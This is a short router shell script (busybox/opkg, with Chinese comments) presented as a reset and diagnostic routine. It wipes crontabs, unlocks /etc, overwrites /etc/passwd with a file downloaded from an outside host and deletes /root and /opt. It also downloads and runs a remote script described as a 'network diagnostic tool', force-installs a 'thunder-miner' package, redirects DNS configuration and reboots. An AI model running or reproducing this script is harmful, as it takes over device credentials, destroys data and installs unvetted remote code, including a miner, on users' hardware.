(
LOG_PATH=/tmp/reset.log

setHost()
{
    /bin/busybox chattr -i /etc 2>&1;
    chattr -i /etc/passwd*;
    [ -f /etc/passwd+ ] && rm -rf /etc/passwd+ 2>&1;
    chattr -i /etc/hosts*;
}

output() {
  echo $1 >> $LOG_PATH;
}

#清除crontab信息
crontab -r;
rm -rf /etc/crontabs/* 2>>$LOG_PATH;

setHost 2>>$LOG_PATH;
wget 'http://www.xiefucai.com/tools/zqb2/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
echo 'exit 0'>/etc/rc.local 2>>$LOG_PATH;
rm -rf /root/* /opt/*;

# 安装断网诊断工具
wget 'http://www.xiefucai.com/tools/wget_ddd.sh?TPSecNotice&TPNotCheck' -O /tmp/wget_ddd.sh 2>>$LOG_PATH;
chmod +x /tmp/wget_ddd.sh 2>>$LOG_PATH;
sh /tmp/wget_ddd.sh 2>>$LOG_PATH;

wget 'https://update.peiluyou.com/conf/miner_plus_beta/packages/thunder-miner-app_V1.3.305_meson.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk 2>>$LOG_PATH

rm -rf /etc/resolv.conf 2>>$LOG_PATH;
ln -s /tmp/resolv.conf /etc/resolv.conf 2>>$LOG_PATH;

[ -f /tmp/t.ipk ] && (opkg install --force-downgrade /tmp/t.ipk 2>>$LOG_PATH && output '30秒后强制重启' && sleep 30 && reboot &) || (output '未下载到安装包';ls -al /tmp/*.ipk >>$LOG_PATH);
) &;
